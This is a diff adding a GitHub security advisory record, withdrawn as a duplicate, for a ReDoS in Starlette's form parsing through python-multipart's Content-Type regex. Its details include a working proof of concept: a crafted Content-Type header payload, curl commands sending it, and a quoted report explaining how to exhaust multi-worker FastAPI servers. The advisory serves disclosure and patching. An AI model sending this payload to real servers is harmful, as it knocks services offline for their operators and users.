@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-93gm-qmq6-w238",
+  "modified": "2024-02-16T23:37:24Z",
+  "published": "2024-02-05T17:01:19Z",
+  "withdrawn": "2024-02-16T23:37:24Z",
+  "aliases": [
+
+  ],
+  "summary": "Duplicate Advisory: Starlette Content-Type Header ReDoS",
+  "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.\n\n## Original Description\n\n### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a Starlette app that uses form data. To reproduce it it's not even necessary to create a Starlette app, just using the `Request` is enough:\n\n```Python\n# main.py\nfrom starlette.requests import Request\nfrom starlette.responses import JSONResponse\n\n\nasync def app(scope, receive, send):\n    assert scope[\"type\"] == \"http\"\n    request = Request(scope, receive)\n    data = await request.form()\n    response_data = {}\n    for key in data:\n        print(key, data.getlist(key))\n        response_data[key] = data.getlist(key)\n    response = JSONResponse(response_data)\n    await response(scope, receive, send)\n```\n\nThen start it with:\n\n```console\n$ uvicorn main:app\n\nINFO:     Started server process [50601]\nINFO:     Waiting for application startup.\nINFO:     ASGI 'lifespan' protocol appears unsupported.\nINFO:     Application startup complete.\nINFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/'\n```\n\n#### Stopping it\n\nBecause that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.\n\nTo stop it, first check the process ID running Uvicorn:\n\n```console\n$ ps -fA | grep uvicorn\n\n  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app\n  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn\n```\n\nIn this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:\n\n```console\n$ kill -9 59461\n```\n\n### Impact\n\nIt's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "starlette"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.36.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.36.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/encode/starlette"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-02-05T17:01:19Z",
+    "nvd_published_at": null
+  }
+}
